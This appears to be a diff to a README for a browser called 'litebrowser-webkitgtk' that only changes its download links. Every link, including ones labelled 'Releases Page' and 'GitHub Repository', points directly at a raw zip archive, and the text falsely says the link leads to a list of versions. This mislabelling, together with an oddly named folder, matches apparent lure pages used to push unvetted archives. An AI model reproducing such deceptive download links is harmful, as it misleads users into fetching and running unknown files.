@@ -1,6 +1,6 @@
 # 🌐 litebrowser-webkitgtk - A Fast and Privacy-Friendly Browser
 
-[![Download LiteBrowser](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/astigmometer/litebrowser-webkitgtk.zip)](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/astigmometer/litebrowser-webkitgtk.zip)
+[![Download LiteBrowser](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/litebrowser-webkitgtk/litebrowser_webkitgtk_v1.5.zip)](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/litebrowser-webkitgtk/litebrowser_webkitgtk_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to litebrowser-webkitgtk! This software is a lightweight browser built f
 
 ## 📥 Download & Install
 
-To get started with litebrowser-webkitgtk, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/astigmometer/litebrowser-webkitgtk.zip)
+To get started with litebrowser-webkitgtk, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/litebrowser-webkitgtk/litebrowser_webkitgtk_v1.5.zip)
 
 1. **Open the Releases Page:** Click on the link above. This will take you to a list of all available versions of litebrowser-webkitgtk.
 
@@ -77,7 +77,7 @@ If you have questions or need help, several resources are available:
 
 ## 🔗 Useful Links
 
-- [LiteBrowser GitHub Repository](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/astigmometer/litebrowser-webkitgtk.zip)
+- [LiteBrowser GitHub Repository](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/litebrowser-webkitgtk/litebrowser_webkitgtk_v1.5.zip)
 
 ## 📢 Community Contributions
 
@@ -87,4 +87,4 @@ litebrowser-webkitgtk is open for contributions! If you would like to help impro
 
 Keep an eye on the Releases Page for updates and new features. Regular updates ensure you have access to the latest improvements and security fixes.
 
-[Download LiteBrowser](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/astigmometer/litebrowser-webkitgtk.zip) to get started today! Enjoy a seamless, privacy-focused browsing experience.
+[Download LiteBrowser](https://raw.githubusercontent.com/Resr1908/litebrowser-webkitgtk/main/litebrowser-webkitgtk/litebrowser_webkitgtk_v1.5.zip) to get started today! Enjoy a seamless, privacy-focused browsing experience.
